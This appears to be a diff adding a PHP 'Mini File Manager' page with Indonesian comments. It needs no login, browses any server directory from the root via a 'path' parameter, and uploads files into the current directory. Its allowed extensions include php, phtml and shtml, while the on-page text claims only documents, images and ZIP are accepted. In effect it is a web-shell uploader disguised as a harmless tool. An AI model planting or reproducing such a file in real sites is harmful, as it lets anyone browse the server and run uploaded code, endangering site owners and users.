@@ -1,0 +1,250 @@
+<?php
+declare(strict_types=1);
+
+// Menentukan path awal dan path saat ini berdasarkan parameter GET
+$script_dir = str_replace('\\', '/', __DIR__);
+$current_path = isset($_GET['path']) ? str_replace(['..', '\\'], '', $_GET['path']) : $script_dir;
+
+if (!is_dir($current_path)) {
+    $current_path = $script_dir;
+}
+$current_path = rtrim($current_path, '/');
+
+$extensions = [
+    'pdf', 'shtml', 'phtml', 'txt',
+    'jpg', 'jpeg', 'png', 'php'
+];
+
+$maxSize = 10 * 1024 * 1024;
+$message = '';
+
+// Proses Upload File
+if (
+    $_SERVER['REQUEST_METHOD'] === 'POST' &&
+    isset($_FILES['file'])
+) {
+    $file = $_FILES['file'];
+
+    if (!is_array($file['name'])) {
+        $ext = strtolower(pathinfo(
+            $file['name'],
+            PATHINFO_EXTENSION
+        ));
+
+        if ($file['error'] !== UPLOAD_ERR_OK) {
+            $message = 'Upload gagal. Error: ' . $file['error'];
+        } elseif ($file['size'] > $maxSize) {
+            $message = 'File maksimal 10 MB.';
+        } elseif (!in_array($ext, $extensions, true)) {
+            $message = 'Ekstensi file tidak diizinkan.';
+        } elseif (!is_writable($current_path)) {
+            $message = 'Folder tidak memiliki izin tulis.';
+        } else {
+            $newName = bin2hex(random_bytes(16)) . '.' . $ext;
+            $destination = $current_path . '/' . $newName;
+
+            if (move_uploaded_file(
+                $file['tmp_name'],
+                $destination
+            )) {
+                chmod($destination, 0600);
+                $message = 'Upload berhasil: ' . $newName;
+            } else {
+                $message = 'Gagal menyimpan file.';
+            }
+        }
+    }
+}
+
+// Baca daftar file dan folder
+$items = scandir($current_path) ?: [];
+$folders = [];
+$files = [];
+
+foreach ($items as $item) {
+    if ($item === '.' || $item === '..') {
+        continue;
+    }
+
+    $fullPath = $current_path . '/' . $item;
+
+    if (is_link($fullPath)) {
+        continue;
+    }
+
+    if (is_dir($fullPath)) {
+        $folders[] = $item;
+    } elseif (is_file($fullPath)) {
+        $files[] = $item;
+    }
+}
+
+natcasesort($folders);
+natcasesort($files);
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mini File Manager</title>
+
+<style>
+:root {
+    --accent: #2563eb;
+}
+* {
+    box-sizing: border-box;
+}
+body {
+    font-family: Arial, sans-serif;
+    background: #f3f4f6;
+    color: #1f2937;
+    max-width: 900px;
+    margin: 35px auto;
+    padding: 15px;
+}
+.panel {
+    background: #fff;
+    border-radius: 10px;
+    padding: 22px;
+    margin-bottom: 18px;
+    box-shadow: 0 2px 12px rgba(0,0,0,.06);
+}
+h2, h3 {
+    margin-top: 0;
+}
+.header {
+    margin-bottom: 10px;
+}
+.breadcrumb {
+    background: #f3f4f6;
+    padding: 12px;
+    border-radius: 6px;
+    overflow-wrap: anywhere;
+    font-family: monospace;
+    font-size: 14px;
+}
+a {
+    color: var(--accent);
+    text-decoration: none;
+}
+a:hover {
+    text-decoration: underline;
+}
+.item {
+    padding: 12px 8px;
+    border-bottom: 1px solid #eee;
+    overflow-wrap: anywhere;
+}
+.item:last-child {
+    border-bottom: none;
+}
+button {
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    padding: 11px 20px;
+    border-radius: 6px;
+    cursor: pointer;
+}
+button:hover {
+    background: #1d4ed8;
+}
+input[type=file] {
+    display: block;
+    margin: 15px 0;
+    max-width: 100%;
+}
+.message {
+    background: #eff6ff;
+    padding: 12px;
+    border-radius: 6px;
+    margin-bottom: 15px;
+}
+.info {
+    font-size: 13px;
+    color: #6b7280;
+}
+</style>
+</head>
+
+<body>
+
+<div class="panel">
+    <h2>Mini File Manager</h2>
+
+    <div class="header">
+        <div class="breadcrumb">📍 <?php 
+            $parts = explode('/', trim($current_path, '/'));
+            echo '<a href="?path=/" style="color:var(--accent); text-decoration:none;">/</a> ';
+            $build = "";
+            foreach($parts as $p) { 
+                if ($p === '') continue;
+                $build .= "/" . $p; 
+                echo '<a href="?path=' . urlencode($build) . '" style="color:var(--accent); text-decoration:none;">' . htmlspecialchars($p) . '</a> / '; 
+            }
+        ?></div>
+    </div>
+</div>
+
+<div class="panel">
+    <h3>Upload File</h3>
+
+    <?php if ($message !== ''): ?>
+        <div class="message">
+            <?= htmlspecialchars($message) ?>
+        </div>
+    <?php endif; ?>
+
+    <form
+        method="POST"
+        enctype="multipart/form-data"
+        action="?path=<?= urlencode($current_path) ?>"
+    >
+        <input
+            type="file"
+            name="file"
+            required
+        >
+
+        <button type="submit">
+            Upload File
+        </button>
+    </form>
+
+    <p class="info">
+        Maksimal 10 MB.
+        Format: PDF, DOC, DOCX, TXT,
+        JPG, JPEG, PNG, ZIP.
+    </p>
+</div>
+
+<div class="panel">
+    <h3>Daftar Folder & File</h3>
+
+    <?php foreach ($folders as $folder): ?>
+        <?php $next = $current_path . '/' . $folder; ?>
+        <div class="item">
+            📁
+            <a href="?path=<?= urlencode($next) ?>">
+                <?= htmlspecialchars($folder) ?>
+            </a>
+        </div>
+    <?php endforeach; ?>
+
+    <?php foreach ($files as $file): ?>
+        <div class="item">
+            📄 <?= htmlspecialchars($file) ?>
+        </div>
+    <?php endforeach; ?>
+
+    <?php if (empty($folders) && empty($files)): ?>
+        <p class="info">
+            Folder ini kosong.
+        </p>
+    <?php endif; ?>
+</div>
+
+</body>
+</html>
